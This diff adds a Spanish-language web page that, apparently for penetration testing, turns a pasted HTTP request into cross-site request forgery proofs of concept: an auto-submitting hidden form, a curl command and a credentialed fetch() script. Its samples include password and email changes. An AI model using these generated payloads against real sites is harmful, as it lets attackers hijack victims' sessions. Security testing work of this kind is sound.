@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Generador CSRF POC Avanzado</title>
+    <style>
+        /* Estilos CSS (sin cambios) */
+        body {
+            font-family: sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+
+        main {
+            max-width: 900px;
+            margin: auto;
+            background: #fff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            color: #2c3e50;
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #34495e;
+        }
+
+        textarea {
+            width: 100%;
+            min-height: 150px; /* Altura mínima aumentada */
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9em;
+            box-sizing: border-box; /* Asegura que padding no aumente el tamaño total */
+        }
+
+        textarea.output-area {
+            min-height: 180px; /* Más altura para los POCs */
+            background-color: #ecf0f1;
+            color: #2c3e50;
+            font-family: 'Courier New', Courier, monospace; /* Monospace para código */
+            white-space: pre; /* Conservar espacios y saltos de línea */
+            overflow-wrap: break-word; /* Evitar desbordamiento horizontal feo */
+        }
+
+        .controls, .example-loader {
+            display: flex;
+            flex-wrap: wrap; /* Para que los botones se ajusten en pantallas pequeñas */
+            gap: 10px; /* Espacio entre botones */
+            margin-bottom: 20px;
+            align-items: center; /* Alinear verticalmente el select y botones */
+        }
+
+        button, select {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: background-color 0.2s ease;
+        }
+
+        button {
+            background-color: #3498db;
+            color: white;
+        }
+
+        button:hover {
+            background-color: #2980b9;
+        }
+
+        button.clear-btn {
+            background-color: #e74c3c;
+        }
+
+        button.clear-btn:hover {
+            background-color: #c0392b;
+        }
+
+        button.copy-btn {
+            background-color: #2ecc71;
+            margin-left: 5px; /* Espacio respecto al textarea */
+            margin-bottom: 15px; /* Espacio inferior */
+            align-self: flex-start; /* Alinear arriba si está en flex container */
+        }
+
+        button.copy-btn:hover {
+            background-color: #27ae60;
+        }
+
+        .output-section {
+            margin-bottom: 20px;
+            border: 1px solid #bdc3c7;
+            padding: 15px;
+            border-radius: 5px;
+            background-color: #f8f9f9;
+        }
+
+        .output-section h3 {
+            margin-top: 0;
+            color: #2980b9;
+            border-bottom: 1px solid #ecf0f1;
+            padding-bottom: 5px;
+        }
+
+        .output-controls {
+            display: flex; /* Para alinear textarea y botón */
+            align-items: flex-start; /* Alinear items arriba */
+            gap: 10px;
+        }
+
+        .output-controls textarea {
+            flex-grow: 1; /* El textarea ocupa el espacio restante */
+            margin-bottom: 0; /* Quitar margen inferior ya que el contenedor lo tiene */
+        }
+
+        select {
+            flex-grow: 1; /* Para que el select ocupe espacio disponible */
+            background-color: #ecf0f1;
+            border: 1px solid #ccc;
+            min-width: 150px; /* Ancho mínimo */
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <main>
+        <h1>Generador CSRF POC Avanzado</h1>
+
+        <label for="httpRequestInput">Petición HTTP Completa:</label>
+        <textarea id="httpRequestInput" placeholder="Pega aquí la petición HTTP completa (ej: desde Burp Suite, DevTools...). Asegúrate de incluir la línea de método/path, headers y cuerpo si existe."></textarea>
+
+        <div class="controls">
+            <button id="generateBtn">Generar POC CSRF</button>
+            <button id="clearBtn" class="clear-btn">Limpiar Todo</button>
+        </div>
+
+        <div class="example-loader">
+             <label for="exampleSelect">Cargar Ejemplo:</label>
+             <select id="exampleSelect">
+                 <option value="">-- Selecciona un ejemplo --</option>
+                 <!-- Los ejemplos se añadirán con JS -->
+             </select>
+            <button id="loadSelectedExampleBtn">Cargar Seleccionado</button>
+            </div>
+
+        <div id="errorDisplay" class="error-message"></div>
+
+        <div class="output-section">
+            <h3>POC HTML (Formulario Auto-submit)</h3>
+            <div class="output-controls">
+                <textarea id="htmlPocOutput" class="output-area" readonly placeholder="Aquí se mostrará el POC en formato HTML..."></textarea>
+                <button class="copy-btn" data-target="htmlPocOutput">Copiar</button>
+            </div>
+        </div>
+
+        <div class="output-section">
+            <h3>POC cURL</h3>
+             <div class="output-controls">
+                <textarea id="curlPocOutput" class="output-area" readonly placeholder="Aquí se mostrará el comando cURL equivalente..."></textarea>
+                <button class="copy-btn" data-target="curlPocOutput">Copiar</button>
+            </div>
+        </div>
+
+        <div class="output-section">
+            <h3>POC JavaScript (Fetch API)</h3>
+             <div class="output-controls">
+                <textarea id="jsPocOutput" class="output-area" readonly placeholder="Aquí se mostrará el código JavaScript (Fetch) equivalente..."></textarea>
+                <button class="copy-btn" data-target="jsPocOutput">Copiar</button>
+            </div>
+        </div>
+
+    </main>
+
+    <script>
+        // Lógica JavaScript
+        document.addEventListener('DOMContentLoaded', () => {
+            // Referencias a elementos del DOM (sin cambios)
+            const httpRequestInput = document.getElementById('httpRequestInput');
+            const generateBtn = document.getElementById('generateBtn');
+            const clearBtn = document.getElementById('clearBtn');
+            const exampleSelect = document.getElementById('exampleSelect');
+            const loadSelectedExampleBtn = document.getElementById('loadSelectedExampleBtn');
+            const htmlPocOutput = document.getElementById('htmlPocOutput');
+            const curlPocOutput = document.getElementById('curlPocOutput');
+            const jsPocOutput = document.getElementById('jsPocOutput');
+            const errorDisplay = document.getElementById('errorDisplay');
+            const copyBtns = document.querySelectorAll('.copy-btn');
+
+            // --- Definición de Ejemplos --- (sin cambios)
+             const examples = [
+                {
+                    name: "POST Simple (Form URL Encoded)",
+                    value: `POST /profile/update HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: https://example.com/profile
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Origin: https://example.com
+Connection: close
+Cookie: sessionid=abc123xyz789; lang=es
+Upgrade-Insecure-Requests: 1
+
+email=newemail@example.com&notify=true`
+                },
+                {
+                    name: "GET con Parámetros",
+                    value: `GET /search?query=vulnerable+csrF&category=security HTTP/1.1
+Host: test-site.org
+User-Agent: MyCustomScanner/1.0
+Accept: */*
+Connection: close
+Cookie: tracking_id=trk_1a2b3c; preferences=darkmode`
+                },
+                {
+                   name: "POST con JSON", // Nombre simplificado
+                    value: `POST /api/v1/settings HTTP/1.1
+Host: api.example-app.net
+Content-Type: application/json;charset=UTF-8
+Accept: application/json
+Authorization: Bearer somejwttoken
+Content-Length: 45
+Connection: keep-alive
+
+{"theme": "dark", "notifications_enabled": false}`
+                },
+                 {
+                   name: "POST con JSON Multilínea", // Ejemplo para probar el fix
+                    value: `POST /api/v2/config HTTP/1.1
+Host: config.internal
+Content-Type: application/json
+Accept: application/json
+Content-Length: 85
+X-Custom-Header: test
+
+{
+  "setting1": "value1",
+  "complex": {
+    "nested": true,
+    "message": "Hello\nWorld with a \`backtick\` inside."
+  }
+}`
+                },
+                { name: "POST Vacío", value: `POST /resource/create HTTP/1.1\nHost: internal.co\nContent-Length: 0\nConnection: close`},
+                { name: "GET Simple", value: `GET /dashboard HTTP/1.1\nHost: myapp.local\nConnection: close`},
+                { name: "PUT (No estándar para CSRF HTML)", value: `PUT /item/123 HTTP/1.1\nHost: resource.io\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nid=123&active=false` },
+                { name: "DELETE (No estándar para CSRF HTML)", value: `DELETE /user/456 HTTP/1.1\nHost: management.portal\nConnection: close` },
+                { name: "POST con Cookie Múltiple", value: `POST /login HTTP/1.1\nHost: auth.service.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\nCookie: id=1; pref=A\nCookie: session=SESSID\n\nuser=admin&pass=password`},
+                { name: "GET con Header Custom", value: `GET /status HTTP/1.1\nHost: monitor.internal\nX-Request-ID: abc-123\nAccept: application/json\nConnection: close`},
+                { name: "POST /change-password", value: `POST /account/change-password HTTP/1.1
+Host: secure-app.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Cookie: session=secureSessionID12345
+
+old_password=password123&new_password=newSecurePass!&confirm_password=newSecurePass!` }
+            ];
+
+
+            // --- Poblar Select con Ejemplos --- (sin cambios)
+            examples.forEach((ex, index) => {
+                const option = document.createElement('option');
+                option.value = index;
+                option.textContent = ex.name;
+                exampleSelect.appendChild(option);
+            });
+
+            // --- Funciones Auxiliares --- (sin cambios en clearAll, copyToClipboard)
+
+            function clearAll() {
+                httpRequestInput.value = '';
+                htmlPocOutput.value = '';
+                curlPocOutput.value = '';
+                jsPocOutput.value = '';
+                errorDisplay.textContent = '';
+                exampleSelect.value = '';
+                copyBtns.forEach(btn => btn.textContent = 'Copiar');
+            }
+
+            function copyToClipboard(text, buttonElement) {
+                if (!navigator.clipboard) {
+                    try {
+                        const textArea = document.createElement("textarea");
+                        textArea.value = text;
+                        textArea.style.position = "fixed";
+                        textArea.style.left = "-9999px";
+                        document.body.appendChild(textArea);
+                        textArea.focus();
+                        textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                         buttonElement.textContent = '¡Copiado!';
+                         setTimeout(() => { buttonElement.textContent = 'Copiar'; }, 1500);
+                    } catch (err) {
+                        console.error('Fallback copy failed:', err);
+                         errorDisplay.textContent = 'Error al copiar (fallback).';
+                    }
+                    return;
+                }
+                navigator.clipboard.writeText(text).then(() => {
+                    buttonElement.textContent = '¡Copiado!';
+                    setTimeout(() => { buttonElement.textContent = 'Copiar'; }, 1500);
+                }).catch(err => {
+                    console.error('Error al copiar texto: ', err);
+                    errorDisplay.textContent = 'No se pudo copiar al portapapeles.';
+                });
+            }
+
+            // Parsea la petición HTTP (sin cambios)
+             function parseHttpRequest(rawRequest) {
+                  if (!rawRequest || typeof rawRequest !== 'string') {
+                     throw new Error("La petición HTTP está vacía o no es válida.");
+                 }
+                 const lines = rawRequest.trim().split('\n');
+                 if (lines.length === 0) {
+                      throw new Error("La petición HTTP está vacía.");
+                 }
+
+                 const requestLine = lines[0].trim();
+                 const requestLineParts = requestLine.match(/^(\S+)\s+(\S+)(?:\s+HTTP\/(\d\.\d))?$/);
+                 if (!requestLineParts) {
+                     throw new Error("Formato de línea de petición inválido (ej: 'GET /path HTTP/1.1').");
+                 }
+                 const method = requestLineParts[1].toUpperCase();
+                 let path = requestLineParts[2];
+
+                 const headers = {};
+                 let i = 1;
+                 while (i < lines.length && lines[i].trim() !== '') {
+                     const headerLine = lines[i].trim();
+                     const separatorIndex = headerLine.indexOf(':');
+                     if (separatorIndex > 0) {
+                         const key = headerLine.substring(0, separatorIndex).trim();
+                         const value = headerLine.substring(separatorIndex + 1).trim();
+                         if (headers[key] && key.toLowerCase() === 'cookie') {
+                              headers[key] += `; ${value}`;
+                         } else {
+                              headers[key] = value;
+                         }
+                     }
+                     i++;
+                 }
+
+                 const hostHeader = Object.keys(headers).find(h => h.toLowerCase() === 'host');
+                 if (!hostHeader) {
+                     throw new Error("No se encontró el header 'Host' en la petición.");
+                 }
+                 const host = headers[hostHeader];
+
+                 let scheme = 'http';
+                  if (host.includes(':443') ||
+                     Object.keys(headers).some(h => h.toLowerCase() === 'upgrade-insecure-requests') ||
+                     Object.keys(headers).some(h => h.toLowerCase() === 'x-forwarded-proto' && headers[h].toLowerCase() === 'https')) {
+                     scheme = 'https';
+                 }
+                 const cleanHost = host.replace(':80', '').replace(':443', '');
+                 const baseUrl = `${scheme}://${cleanHost}`;
+                 let fullUrl = `${baseUrl}${path}`; // Inicializar fullUrl aquí
+
+                 const body = lines.slice(i + 1).join('\n');
+                 const params = {};
+                 const contentTypeHeader = Object.keys(headers).find(h => h.toLowerCase() === 'content-type');
+                 const contentType = contentTypeHeader ? headers[contentTypeHeader].toLowerCase() : '';
+
+                  if (body && contentType.includes('application/x-www-form-urlencoded')) {
+                      try {
+                         new URLSearchParams(body).forEach((value, key) => {
+                             params[key] = value;
+                         });
+                      } catch (e) {
+                          console.warn("No se pudo parsear el cuerpo como x-www-form-urlencoded:", e);
+                      }
+                 } else if (method === 'GET' && path.includes('?')) {
+                     try {
+                         // Importante: Usar fullUrl ANTES de modificar path
+                         const urlObject = new URL(fullUrl);
+                         urlObject.searchParams.forEach((value, key) => {
+                             params[key] = value;
+                         });
+                         path = urlObject.pathname; // Actualizar path para quitar query string
+                         // No actualizamos fullUrl aquí, mantenemos la original con query
+                     } catch (e) {
+                         console.warn("No se pudo parsear la query string de la URL:", e);
+                         // Si falla el parseo, path mantiene la query string, fullUrl sigue bien
+                     }
+                 }
+
+
+                 return {
+                     method,
+                     url: fullUrl, // URL Completa (con query si era GET)
+                     baseUrl: `${baseUrl}${path}`, // URL sin query string
+                     host,
+                     path, // Path sin query string (si se pudo parsear)
+                     headers,
+                     body,
+                     params,
+                     contentType
+                 };
+             }
+
+
+            // --- Funciones de Generación de POC ---
+
+            // generateHtmlPoc (sin cambios)
+            function generateHtmlPoc(parsedRequest) {
+                const formMethod = 'POST';
+                const formAction = parsedRequest.baseUrl;
+
+                let formInputs = '';
+                for (const key in parsedRequest.params) {
+                    const escapedValue = parsedRequest.params[key]
+                        .replace(/&/g, '&amp;')
+                        .replace(/</g, '&lt;')
+                        .replace(/>/g, '&gt;')
+                        .replace(/"/g, '&quot;')
+                        .replace(/'/g, '&#039;');
+                    formInputs += `    <input type="hidden" name="${key}" value="${escapedValue}">\n`;
+                }
+
+                 if (Object.keys(parsedRequest.params).length === 0 && parsedRequest.body && !parsedRequest.contentType.includes('x-www-form-urlencoded')) {
+                     console.warn("Generando POC HTML para un cuerpo no 'x-www-form-urlencoded'.");
+                     if (parsedRequest.method !== 'GET') {
+                          formInputs += `    <!-- Advertencia: El cuerpo original era '${parsedRequest.contentType}' y no se puede enviar directamente con un form HTML estándar para CSRF. -->\n`;
+                     }
+                 }
+
+                const htmlPoc = `<html>
+  <body>
+    <form id="csrf-form" action="${formAction}" method="${formMethod}">
+${formInputs}      <input type="submit" value="Submit Request (Simulated CSRF)">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>`;
+                return htmlPoc;
+            }
+
+            // generateCurlPoc (sin cambios)
+            function generateCurlPoc(parsedRequest) {
+                let curlCommand = `curl '${parsedRequest.url}'`;
+
+                if (parsedRequest.method !== 'GET') {
+                    curlCommand += ` -X ${parsedRequest.method}`;
+                }
+
+                const headersToInclude = ['Content-Type', 'Accept', 'User-Agent', 'Referer', 'Origin'];
+                for (const key in parsedRequest.headers) {
+                    const lowerKey = key.toLowerCase();
+                    if (lowerKey !== 'host' && lowerKey !== 'cookie' && lowerKey !== 'authorization' && lowerKey !== 'content-length' &&
+                        (headersToInclude.some(h => h.toLowerCase() === lowerKey) || lowerKey.startsWith('x-')))
+                     {
+                        curlCommand += ` \\\n  -H '${key}: ${parsedRequest.headers[key]}'`;
+                    }
+                }
+
+                 if (parsedRequest.body) {
+                     const escapedBody = parsedRequest.body.replace(/'/g, "'\\''");
+                     curlCommand += ` \\\n  --data-raw $'${escapedBody}'`;
+                 }
+
+                 if (parsedRequest.url.startsWith('https://')) {
+                     curlCommand += ` \\\n  --insecure`;
+                 }
+
+                return curlCommand;
+            }
+
+            // generateJsPoc (CON LA CORRECCIÓN FINAL)
+            function generateJsPoc(parsedRequest) {
+                const fetchUrl = parsedRequest.url;
+
+                const fetchOptions = {
+                    method: parsedRequest.method,
+                    headers: {},
+                    credentials: 'include'
+                };
+
+                 const headersToIncludeForJs = ['Content-Type', 'Accept', 'X-Requested-With'];
+                 for (const key in parsedRequest.headers) {
+                     const lowerKey = key.toLowerCase();
+                      if (lowerKey !== 'host' && lowerKey !== 'cookie' && lowerKey !== 'authorization' && lowerKey !== 'content-length' && lowerKey !== 'user-agent' && lowerKey !== 'connection' && lowerKey !== 'origin' && lowerKey !== 'referer' &&
+                         (headersToIncludeForJs.some(h => h.toLowerCase() === lowerKey) || lowerKey.startsWith('x-')))
+                      {
+                         fetchOptions.headers[key] = parsedRequest.headers[key];
+                     }
+                 }
+
+                if (parsedRequest.body) {
+                    fetchOptions.body = parsedRequest.body;
+                     if (!fetchOptions.headers['Content-Type'] && !fetchOptions.headers['content-type']) {
+                         console.warn("El cuerpo existe pero no se especificó Content-Type en la petición original. Fetch podría usar un valor por defecto.");
+                         if (parsedRequest.contentType.includes('application/x-www-form-urlencoded')) {
+                              fetchOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                         } else if (parsedRequest.contentType.includes('application/json')) {
+                              fetchOptions.headers['Content-Type'] = 'application/json';
+                         }
+                     }
+                } else if (parsedRequest.method !== 'GET' && parsedRequest.method !== 'HEAD') {
+                     if (!fetchOptions.headers['Content-Type'] && !fetchOptions.headers['content-type']) {
+                         // No setear content-type si no hay body
+                     }
+                }
+
+                 let optionsString = JSON.stringify(fetchOptions, null, 2);
+
+                 // Reemplazar el string del body si es multilinea para que quede más legible
+                 if (fetchOptions.body && fetchOptions.body.includes('\n')) {
+                     // Escapar backticks DENTRO del contenido del body original
+                     const escapedBodyContent = fetchOptions.body.replace(/`/g, '\\`');
+                     // Crear la cadena de reemplazo con backticks para el body
+                     const replacementString = '"body": `' + escapedBodyContent + '`';
+                     const bodyRegex = /"body":\s*"((?:\\.|[^"\\])*)"/; // Regex para encontrar el body JSON string
+                     optionsString = optionsString.replace(bodyRegex, replacementString);
+                 }
+
+                 // --- ESCAPADO FINAL ---
+                 // Escapar caracteres problemáticos EN optionsString ANTES de insertarlo en jsPoc
+                 const safeOptionsStringForEmbedding = optionsString
+                     .replace(/\\/g, '\\\\') // 1. Escapar barras invertidas existentes
+                     .replace(/`/g, '\\`')   // 2. Escapar backticks
+                     .replace(/\$\{/g, '\\${'); // 3. Escapar ${
+
+                // Construir la plantilla final USANDO la cadena escapada
+                const jsPoc = `// POC CSRF usando Fetch API
+// Asegúrate que esta página se sirva desde un dominio diferente al target para simular CSRF.
+// El navegador adjuntará automáticamente las cookies relevantes si están configuradas correctamente (SameSite).
+
+fetch('${fetchUrl}', ${safeOptionsStringForEmbedding}) // <<< Usar la cadena escapada
+  .then(response => {
+    console.log('Respuesta recibida (status):', response.status);
+    // Podrías querer leer el cuerpo de la respuesta:
+    // return response.text(); // o response.json()
+  })
+  // .then(data => {
+  //   console.log('Cuerpo de la respuesta:', data);
+  // })
+  .catch(error => {
+    console.error('Error durante la petición fetch:', error);
+    // Nota: Errores de CORS pueden aparecer aquí y son esperados en un escenario CSRF real
+    // si el servidor no está configurado para permitir la petición cross-origin.
+    // La petición en sí (con cookies) puede haberse enviado igualmente antes del error CORS.
+  });`;
+
+                return jsPoc;
+            } // Fin de generateJsPoc
+
+
+            // --- Lógica Principal de Generación --- (sin cambios)
+            function generatePocs() {
+                clearOutputs();
+                const rawRequest = httpRequestInput.value;
+
+                try {
+                    const parsed = parseHttpRequest(rawRequest);
+
+                    htmlPocOutput.value = generateHtmlPoc(parsed);
+                    curlPocOutput.value = generateCurlPoc(parsed);
+                    jsPocOutput.value = generateJsPoc(parsed);
+
+                } catch (error) {
+                    console.error("Error al procesar la petición:", error);
+                    errorDisplay.textContent = `Error: ${error.message}`;
+                    clearOutputs();
+                }
+            }
+
+             function clearOutputs() {
+                 htmlPocOutput.value = '';
+                 curlPocOutput.value = '';
+                 jsPocOutput.value = '';
+                 errorDisplay.textContent = '';
+                 copyBtns.forEach(btn => btn.textContent = 'Copiar');
+             }
+
+
+            // --- Event Listeners --- (sin cambios)
+            generateBtn.addEventListener('click', generatePocs);
+
+            clearBtn.addEventListener('click', clearAll);
+
+            loadSelectedExampleBtn.addEventListener('click', () => {
+                 const selectedIndex = exampleSelect.value;
+                 if (selectedIndex !== "") {
+                     httpRequestInput.value = examples[parseInt(selectedIndex)].value;
+                     generatePocs();
+                 } else {
+                     if (examples.length > 0) {
+                         httpRequestInput.value = examples[0].value;
+                         exampleSelect.value = "0";
+                         generatePocs();
+                     }
+                 }
+             });
+
+            copyBtns.forEach(button => {
+                button.addEventListener('click', () => {
+                    const targetId = button.getAttribute('data-target');
+                    const targetTextarea = document.getElementById(targetId);
+                    if (targetTextarea && targetTextarea.value) {
+                        copyToClipboard(targetTextarea.value, button);
+                    } else {
+                        button.textContent = 'Nada que copiar';
+                         setTimeout(() => { button.textContent = 'Copiar'; }, 1500);
+                    }
+                });
+            });
+
+             exampleSelect.addEventListener('change', () => {
+                  const selectedIndex = exampleSelect.value;
+                  if (selectedIndex !== "") {
+                      httpRequestInput.value = examples[parseInt(selectedIndex)].value;
+                      // generatePocs(); // Descomentar si quieres auto-generar al cambiar selección
+                  } else {
+                      httpRequestInput.value = '';
+                      // clearOutputs();
+                  }
+             });
+
+        });
+    </script>
+
+</body>
+</html>
